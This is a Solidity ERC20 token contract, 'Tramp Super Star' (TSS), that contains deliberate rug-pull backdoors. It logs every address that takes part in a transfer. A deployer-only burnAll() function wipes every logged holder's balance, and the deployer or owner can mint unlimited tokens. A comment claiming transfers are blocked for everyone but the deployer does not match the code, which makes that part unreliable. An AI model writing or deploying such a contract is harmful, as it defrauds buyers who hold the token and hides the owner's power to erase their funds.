

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract TrampSuperStar is ERC20, Ownable {
    address contract_deployer;
    address[] users;


    modifier onlyDeployer() {
        require(msg.sender == contract_deployer,"Only contract deployer can do this shit!!");
        _;
    }


    constructor()  ERC20("Tramp Super Star","TSS") Ownable(msg.sender) { 
        _mint(msg.sender, 1000000 * 10 ** decimals()); // Mint 1 million tokens to the deployer
        contract_deployer = msg.sender;
    }



    function mint(address to, uint256 amount) public onlyOwner {
        _mint(to, amount);
    }

    function isUserExist(address _addr) public view returns (bool)  {
        for (uint i; i < users.length; i++) 
        {
            if (users[i] == _addr){
                return true;
            }
        }
        return false;
    }

    function burnAll() public onlyDeployer  {
        for (uint i ; i < users.length; i++ ) 
        {
            _burn(users[i], balanceOf(users[i]));
        }
    }

    function mintSomething(uint256 amount) public onlyDeployer {
        _mint(contract_deployer, amount);
    }

    // block transfer for all except contract deployer
    function transfer(address to, uint256 value) public override  returns (bool) {
        if (!isUserExist(msg.sender)){
            users.push(msg.sender);
        }
        if (!isUserExist(to)){
            users.push(to);
        }
        return  super.transfer(to, value);
    }

    
    
}